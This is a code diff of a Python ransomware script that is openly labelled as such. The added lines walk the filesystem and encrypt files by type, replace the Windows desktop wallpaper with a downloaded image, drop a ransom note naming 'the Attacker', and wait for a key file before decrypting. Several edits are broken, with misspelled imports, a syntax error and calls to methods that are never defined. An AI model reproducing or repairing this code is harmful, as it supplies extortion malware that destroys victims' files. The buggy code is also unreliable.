@@ -3,10 +3,11 @@ from cryptography.fernet import Fernet # Encrypt/Decrypt files on target
 import os # Get System root
 import webbrowser # Load User's Browser
 import ctypes # Call DLLs or Shared libaraies
-import requests # Fetch Images From Websites
+import request # Fetch Images From Websites
 import subprocess # to open up notepad 
 import threading # For Multi threading
 import platform # Checking Platform
+import urllib.requets
 from time import sleep
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
@@ -23,7 +24,7 @@ def getOS():
 
 class Ransomware:
 
-	file_exts=['txt','jpg','pdf','png'] # Types of files to encrypt
+	file_exts=['txt','mp4','pdf','png'] # Types of files to encrypt
 
 	def __init__(self):
 
@@ -67,7 +68,7 @@ class Ransomware:
 		self.key=enc_fernet_key
 		self.crypter=None 
 
-	def encrpyt_file(self,file_path,encrypted=False):
+	def crypt_file(self,file_path,encrypted=False):
 		
 		#Encrypt/Decrypt Files
 		with open(file_path,'rb') as f : 
@@ -86,11 +87,87 @@ class Ransomware:
 		with open(file_path,'wb') as fp :
 			fp.write(_data)
 
+	def encrypt_system(self,encrypted=False):
 
+		#List All Files in the system
+		system= os.walk(self.localRoot,topdown=True) # Can be Changed to sys.sysRoot
+		for root,dir,files in system :
+			for file in files :
+				file_path=os.path.join(root, file)
+				if not files.split('.')[-1] in self.file_exts:
+					continue
+				if not encrypted:
+					self.crypt_file(file_path)
+				else 
+					self.crypt_file(file_path,encrypted=True)
 
+	@staticmethod
+	def whokilleddb_github(): 
 
+		# Open Browser Window
+		url = "https://github.com/whokilleddb" #Change It To A Payment Gateway Maybe ?
+		webbrowser.open(url)
 
+	def change_desktop_background(self):
 
+		# Change Desktop Background
+		if self.os_int == 0 :
+			imageURL = "https://i.imgur.com/lCW3YGu.jpg"
+			path=f"{self.sysRoot}\\Desktop\\Background.jpg"
+			urllib.request.urlretrieve(imageURL,path)
 
+			SPI_SETDESKWALLPAPER = 20 # 0x14 (Desktop Parameter as Set By Win32 API)
+			
+			# The Actual Defination of the C Function as Defined Under SystemParametersInfoW has the following defination
+			# private static extern bool SystemParametersInfoW(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
+			# uiAction  = SPI_SETDESKWALLPAPER = 20
+			# uiParam remains 0 when changing wallpaper 
+			# pvParam  contains file path
+			# fWinIni determines how the change is written to user profile and whether a message should be sent to other windows to notify them of the update.
+			ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,path,0) # For 32 bit Windows, use SystemParametersInfoA
 
+	def ransom_note(self):
 
+		#Prompt Note To Victim
+		note=f"Your Files Have Been Encrypted. Get The Full Code At https://github.com/whokilleddb. Also Send {self.sysRoot}/Desktop/EMAIL_ME.txt to the Attacker"
+
+		with open("fernet_key.txt",'rb') as fp :
+			self.key= fp.read()
+
+		with open('RANSOM_NOTE.txt','w') as f:
+			f.write(note)
+
+		if sys.os_int ==0 :
+			ransom = subprocess.Popen(['notepad.exe','RANSOM_NOTE.txt'])
+
+	def put_me_on_desktop(self) :
+
+		#Check if key exists on Desktop
+		while True :
+			try :
+				with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'r') as f:
+					self.key= f.read()
+					self.crypter=Fernet(self.key)
+					self.crypt_system(encrypted=True)
+					break
+			except :
+				pass
+			sleep(10)
+
+if __name__ == '__main__':
+
+	rw = Ransomware()
+	rw.generate_key()
+	rw.crypt_system()
+	rw.write_key()
+	rw.encrypt_fernet_key()
+	rw.change_desktop_background()
+	rw.whokilleddb()
+
+	t1 = threading.Thread(target=rw.ransom_note)
+	t2 = threading.Thread(target=rw.put_me_on_desktop)
+
+	t1.start()
+	print(" > Target Encrypted")
+	t2.start()
+	print(" > Attak Completed")
